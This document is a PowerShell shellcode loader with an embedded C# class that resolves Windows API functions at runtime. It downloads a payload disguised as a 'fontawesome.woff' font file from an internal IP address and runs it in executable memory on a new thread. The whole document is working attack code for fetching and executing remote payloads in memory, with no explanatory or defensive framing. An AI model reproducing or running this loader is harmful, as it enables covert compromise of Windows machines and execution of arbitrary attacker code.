$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32
{
    public delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    public delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    public delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

    public static IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
    {
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr procAddress = GetProcAddress(kernel32, "VirtualAlloc");
        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(VirtualAllocDelegate));
        return virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    }

    public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
    {
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr procAddress = GetProcAddress(kernel32, "CreateThread");
        CreateThreadDelegate createThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(CreateThreadDelegate));
        return createThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    }

    public static UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds)
    {
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr procAddress = GetProcAddress(kernel32, "WaitForSingleObject");
        WaitForSingleObjectDelegate waitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(WaitForSingleObjectDelegate));
        return waitForSingleObject(hHandle, dwMilliseconds);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string dllToLoad);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
}
"@
Add-Type $Win32

$shellcode = (New-Object System.Net.WebClient).DownloadData("http://192.168.2.63/fontawesome.woff")
if ($shellcode -eq $null) {Exit}
$size = $shellcode.Length

[IntPtr]$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
$thandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
